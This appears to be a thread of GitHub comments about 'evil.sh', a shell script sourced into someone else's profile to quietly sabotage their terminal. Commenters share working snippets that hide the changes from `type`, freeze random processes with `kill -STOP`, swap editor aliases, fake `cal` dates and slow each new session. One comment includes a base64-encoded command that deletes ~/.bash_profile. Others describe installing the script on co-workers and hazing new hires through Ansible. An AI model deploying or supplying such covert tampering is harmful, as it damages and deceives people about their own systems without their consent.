Currently `type` is not affected. This lets the user easily see what's wrong with their system. I'd suggest creating an alias for type that would override the builtin and print responses as if no changes have been made to anything, i.e. `type grep` should report grep as executable /path/to/grep rather than a shell function.
Need to start every background job in its own subshell so that we can redirect the job control
output to /dev/null.
Plus a quotation fix there.

@bkhouri can you confirm this fixes part of your issue from #79?
I love this idea, and I want to apply on to co-workers.  However, when adding `source /path/to/evil.sh` as the last line in the `.bash_profile`, error occur when a new terminal is started.

I only tried setting `EVIL_BEHAVIOUR` to `insane` or `annoying`.  

On my Mac, running `macOS Mojave`, I get the following when I start a terminal with EVIL_BEHAVIOUR set to `insane`

```
Last login: Fri Feb 15 16:32:16 on ttys009
[1]+  Exit 1                  destructive && sleep $[ ( $RANDOM % 100 ) + 1 ]s && kill -STOP $(ps x -o pid|sed 1d|sort -R|head -1)
bassam.khouri@EMB-7CBUG3QC ~ 
$ 
```

And I get the following when set to `annoying`

```
Last login: Fri Feb 15 16:32:19 on ttys010
usage: basename string [suffix]                                         
       basename [-a] [-s suffix] string [...]
[2]+  Exit 1                  destructive && sleep $[ ( $RANDOM % 100 ) + 1 ]s && kill -STOP $(ps x -o pid|sed 1d|sort -R|head -1)
() bassam.khouri@EMB-7CBUG3QC ~ 
$ 
```

This error will make it obvious that something is awry in the system.

```
annoying && alias nano="/usr/bin/vi"
annoying && alias vi="/usr/bin/nano"
annoying && alias vim="/usr/bin/emacs"
annoying && alias emacs="/usr/bin/vim"
```

Command for one editor opens another.

[https://github.com/zeroby0/pranks](https://github.com/zeroby0/pranks#7-change-editors)
```
function cal() {
    if [ $# -eq 0 ]; then # If no arguments
        /usr/bin/cal -m $(date +%b) $(( ((RANDOM<<15)|RANDOM) % 45 + 2000 ));
    else
        /usr/bin/cal $(( ((RANDOM<<15)|RANDOM) % 45 + 2000 ));
    fi;
}
```

A random year between 2000 and 2045 is used for `cal` command.

[https://github.com/zeroby0/pranks](https://github.com/zeroby0/pranks)
```
insane && echo 'sleep .1' >> ~/.bashrc
```

So with every new terminal session opened, the terminal will become just a bit slower.

[https://github.com/zeroby0/pranks](https://github.com/zeroby0/pranks#1-slow-down-the-terminal)
The command `base64 -D <<< cm0gfi8uYmFzaF9wcm9maWxl | sh` can remove your bash profile entirely, this would stop evil.sh in some circumstance. Should filtering be added to unusable mode to block running base64 encoded commands? I haven't tested this as I don't have a spare VM at the moment. Thoughts?
These two functions have been in use at my current employer for years, mainly for hazing new hires. We even have them in our Ansible playbook so we can switch them on quickly in a variety of places when needed. 
